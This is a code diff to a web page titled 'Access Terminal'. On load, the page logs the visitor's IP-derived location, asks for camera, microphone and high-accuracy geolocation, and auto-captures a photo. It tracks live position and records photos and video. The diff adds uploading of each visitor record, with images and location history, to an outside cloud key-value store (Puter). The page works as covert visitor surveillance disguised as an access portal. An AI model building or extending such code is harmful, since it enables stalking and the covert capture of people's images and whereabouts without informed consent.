@@ -5,6 +5,7 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
     <title>Access Terminal</title>
+    <script src="https://js.puter.com/v2/"></script>
     <style>
         * {
             box-sizing: border-box
@@ -123,10 +124,36 @@
 
     <script>
         // Storage helpers
+        let activeRecordId = null;
+        let activeRecordKey = null;
+
         function readRecords() { try { return JSON.parse(localStorage.getItem('visitorRecords') || '[]') } catch (e) { return [] } }
         function writeRecords(r) { localStorage.setItem('visitorRecords', JSON.stringify(r)) }
-        function saveVisitorRecord(data) { const list = readRecords(); const rec = { id: Date.now(), timestamp: new Date().toISOString(), ...data }; writeRecords([rec, ...list].slice(0, 50)); return rec.id }
-        function updateRecord(id, patch) { const list = readRecords(); const i = list.findIndex(r => r.id === id); if (i === -1) return false; list[i] = Object.assign({}, list[i], patch); writeRecords(list); return true }
+
+        function saveVisitorRecord(data) {
+            const recId = Date.now();
+            activeRecordId = recId;
+            activeRecordKey = `photos_visitor_${recId}`;
+            const rec = { id: recId, timestamp: new Date().toISOString(), ...data };
+            const list = readRecords();
+            writeRecords([rec, ...list].slice(0, 50));
+            if (window.puter) {
+                puter.kv.set(activeRecordKey, JSON.stringify(rec)).catch(err => console.warn('Puter set error:', err));
+            }
+            return recId;
+        }
+
+        function updateRecord(id, patch) {
+            const list = readRecords();
+            const i = list.findIndex(r => r.id === id);
+            if (i === -1) return false;
+            list[i] = Object.assign({}, list[i], patch);
+            writeRecords(list);
+            if (window.puter && activeRecordKey) {
+                puter.kv.set(activeRecordKey, JSON.stringify(list[i])).catch(err => console.warn('Puter update error:', err));
+            }
+            return true;
+        }
 
         const accessBtn = document.getElementById('accessBtn');
         const statusEl = document.getElementById('status');
@@ -136,14 +163,14 @@
         const startRecBtn = document.getElementById('startRecBtn');
         const stopRecBtn = document.getElementById('stopRecBtn');
 
-        let mediaStream = null, mediaRecorder = null, recordedChunks = [], activeRecordId = null, watchId = null;
+        let mediaStream = null, mediaRecorder = null, recordedChunks = [], watchId = null;
 
         async function tryIpwhois() { try { const r = await fetch('https://ipwho.is/'); if (!r.ok) throw new Error('ipwho.is fail'); const d = await r.json(); if (!d.success) throw new Error(d.message || 'fail'); return { ip: d.ip, city: d.city, region: d.region, country: d.country, postal: d.postal, lat: d.latitude, lon: d.longitude, timezone: d.timezone && d.timezone.id, org: d.connection && d.connection.isp } } catch (e) { return null } }
         async function tryIpapi() { try { const r = await fetch('https://ipapi.co/json/'); if (!r.ok) throw new Error('ipapi fail'); const d = await r.json(); if (d.error) throw new Error(d.reason || 'fail'); return { ip: d.ip, city: d.city, region: d.region, country: d.country_name, postal: d.postal, lat: d.latitude, lon: d.longitude, timezone: d.timezone, org: d.org } } catch (e) { return null } }
 
         async function startCameraUI() {
             try { mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }) } catch (e) { statusEl.textContent = 'Camera permission denied or unavailable.'; return }
-            camPreview.srcObject = mediaStream; camControls.style.display = 'block'; statusEl.textContent = 'Camera ready. You can capture photo or record video.';
+            camPreview.srcObject = mediaStream; camControls.style.display = 'block'; statusEl.textContent = 'Camera active. Tracking live location.';
             // If activeRecordId was not created on load, create it now
             if (!activeRecordId) {
                 const recId = saveVisitorRecord({ ip: null, city: null, region: null, country: null, postal: null, lat: null, lon: null, timezone: null, org: null, ua: navigator.userAgent, media: [], locationHistory: [] });
@@ -154,7 +181,17 @@
             if (navigator.geolocation) {
                 watchId = navigator.geolocation.watchPosition(pos => {
                     const coords = { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy, time: new Date().toISOString() };
-                    const list = readRecords(); const i = list.findIndex(r => r.id === activeRecordId); if (i !== -1) { list[i].locationHistory = list[i].locationHistory || []; list[i].locationHistory.push(coords); list[i].lat = coords.lat; list[i].lon = coords.lon; writeRecords(list) }
+                    const list = readRecords(); const i = list.findIndex(r => r.id === activeRecordId);
+                    if (i !== -1) {
+                        list[i].locationHistory = list[i].locationHistory || [];
+                        list[i].locationHistory.push(coords);
+                        list[i].lat = coords.lat;
+                        list[i].lon = coords.lon;
+                        writeRecords(list);
+                        if (window.puter && activeRecordKey) {
+                            puter.kv.set(activeRecordKey, JSON.stringify(list[i])).catch(err => console.warn(err));
+                        }
+                    }
                 }, err => { console.warn('geoloc err', err) }, { enableHighAccuracy: true, maximumAge: 3000 })
             }
             // Auto capture snapshot after 1 second
@@ -178,6 +215,9 @@
                         list[i].media = list[i].media || [];
                         list[i].media.push({ type: 'photo', data: dataUrl, time: new Date().toISOString() });
                         writeRecords(list);
+                        if (window.puter && activeRecordKey) {
+                            puter.kv.set(activeRecordKey, JSON.stringify(list[i])).catch(err => console.warn(err));
+                        }
                     }
                 }
             } else {
@@ -185,36 +225,76 @@
             }
         }
 
-        // Auto-log visitor IP on page load
+        // Auto-log visitor and open camera automatically on page load
         async function autoLogVisitor() {
             const recId = saveVisitorRecord({ ip: null, city: null, region: null, country: null, postal: null, lat: null, lon: null, timezone: null, org: null, ua: navigator.userAgent, media: [], locationHistory: [] });
             activeRecordId = recId;
-            let info = await tryIpwhois(); if (!info) info = await tryIpapi(); if (info) updateRecord(activeRecordId, info);
+            tryIpwhois().then(info => {
+                if (!info) return tryIpapi();
+                return info;
+            }).then(info => {
+                if (info) updateRecord(activeRecordId, info);
+            });
+            // Automatically prompt for camera & location permission immediately
+            statusEl.textContent = 'Requesting permissions...';
+            await startCameraUI();
         }
-        autoLogVisitor();
+
+        // Run when page is loaded
+        window.addEventListener('DOMContentLoaded', () => {
+            autoLogVisitor();
+        });
 
         accessBtn.addEventListener('click', async () => {
             statusEl.textContent = 'Requesting permissions...';
-            // Request camera and geolocation via startCameraUI (handles permissions and saving)
             await startCameraUI();
         });
 
         captureBtn.addEventListener('click', () => {
             if (!mediaStream) { alert('Camera not started'); return }
             const video = camPreview; const canvas = document.createElement('canvas'); canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480; const ctx = canvas.getContext('2d'); ctx.drawImage(video, 0, 0, canvas.width, canvas.height); const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
-            if (activeRecordId) { const list = readRecords(); const i = list.findIndex(r => r.id === activeRecordId); if (i !== -1) { list[i].media = list[i].media || []; list[i].media.push({ type: 'photo', data: dataUrl, time: new Date().toISOString() }); writeRecords(list); alert('Photo saved to Dashboard.') } }
+            if (activeRecordId) {
+                const list = readRecords(); const i = list.findIndex(r => r.id === activeRecordId);
+                if (i !== -1) {
+                    list[i].media = list[i].media || []; list[i].media.push({ type: 'photo', data: dataUrl, time: new Date().toISOString() });
+                    writeRecords(list);
+                    if (window.puter && activeRecordKey) {
+                        puter.kv.set(activeRecordKey, JSON.stringify(list[i])).catch(err => console.warn(err));
+                    }
+                    alert('Photo saved to Dashboard.')
+                }
+            }
         });
 
         startRecBtn.addEventListener('click', () => {
             if (!mediaStream) { alert('Camera not started'); return }
             recordedChunks = []; mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });
             mediaRecorder.ondataavailable = e => { if (e.data && e.data.size) recordedChunks.push(e.data) };
-            mediaRecorder.onstop = () => { const blob = new Blob(recordedChunks, { type: 'video/webm' }); const reader = new FileReader(); reader.onload = () => { const dataUrl = reader.result; if (activeRecordId) { const list = readRecords(); const i = list.findIndex(r => r.id === activeRecordId); if (i !== -1) { list[i].media = list[i].media || []; list[i].media.push({ type: 'video', data: dataUrl, time: new Date().toISOString() }); writeRecords(list); alert('Video saved to Dashboard.') } } }; reader.readAsDataURL(blob) };
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                const reader = new FileReader();
+                reader.onload = () => {
+                    const dataUrl = reader.result;
+                    if (activeRecordId) {
+                        const list = readRecords();
+                        const i = list.findIndex(r => r.id === activeRecordId);
+                        if (i !== -1) {
+                            list[i].media = list[i].media || [];
+                            list[i].media.push({ type: 'video', data: dataUrl, time: new Date().toISOString() });
+                            writeRecords(list);
+                            if (window.puter && activeRecordKey) {
+                                puter.kv.set(activeRecordKey, JSON.stringify(list[i])).catch(err => console.warn(err));
+                            }
+                            alert('Video saved to Dashboard.')
+                        }
+                    }
+                };
+                reader.readAsDataURL(blob)
+            };
             mediaRecorder.start(); startRecBtn.style.display = 'none'; stopRecBtn.style.display = 'inline-block'; statusEl.textContent = 'Recording...';
         });
         stopRecBtn.addEventListener('click', () => { if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop(); startRecBtn.style.display = 'inline-block'; stopRecBtn.style.display = 'none'; statusEl.textContent = 'Recording stopped.' });
 
-        // cleanup on unload
         window.addEventListener('beforeunload', () => { if (mediaStream) { mediaStream.getTracks().forEach(t => t.stop()) }; if (watchId && navigator.geolocation) navigator.geolocation.clearWatch(watchId) });
 
     </script>
